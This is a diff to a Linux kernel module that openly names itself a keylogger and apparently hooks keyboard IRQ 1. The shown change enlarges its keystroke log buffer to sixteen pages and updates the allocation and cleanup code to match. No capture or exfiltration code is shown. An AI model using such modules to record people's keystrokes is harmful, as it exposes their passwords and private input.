@@ -19,6 +19,7 @@ MODULE_DESCRIPTION("keyboard bad keylogger");
 
 #define	MODULE_NAME		"keylogger"
 #define KEYBOARD_IRQ		1
+#define LOG_PAGE_SIZE		(PAGE_SIZE * 16)
 
 struct key_map {
 	char			ascii;
@@ -69,13 +70,13 @@ static struct key_log_index	*key_log_create_page(struct key_log_index *next)
 	void		*ptr;
 	size_t		blocks;
 
-	ptr = kmalloc(PAGE_SIZE, GFP_KERNEL);
+	ptr = kmalloc(LOG_PAGE_SIZE, GFP_KERNEL);
 	if (!ptr)
 		return NULL;
-	blocks = (PAGE_SIZE - (sizeof(struct key_log_index))) /
+	blocks = (LOG_PAGE_SIZE - (sizeof(struct key_log_index))) /
 		 sizeof(struct key_log_entry);
 	pr_info("created a new page of %lu logs enties", blocks);
-	memset(ptr, 0, PAGE_SIZE);
+	memset(ptr, 0, LOG_PAGE_SIZE);
 	*((struct key_log_index *)ptr) = (struct key_log_index) {
 		.prev = NULL,
 		.next = next,
@@ -105,7 +106,7 @@ static void		key_log_clean(void)
 	lst = key_full_log;
 	while (lst) {
 		next = lst->next;
-		memset(lst, 0, PAGE_SIZE);
+		memset(lst, 0, LOG_PAGE_SIZE);
 		kfree(lst);
 		lst = next;
 	}
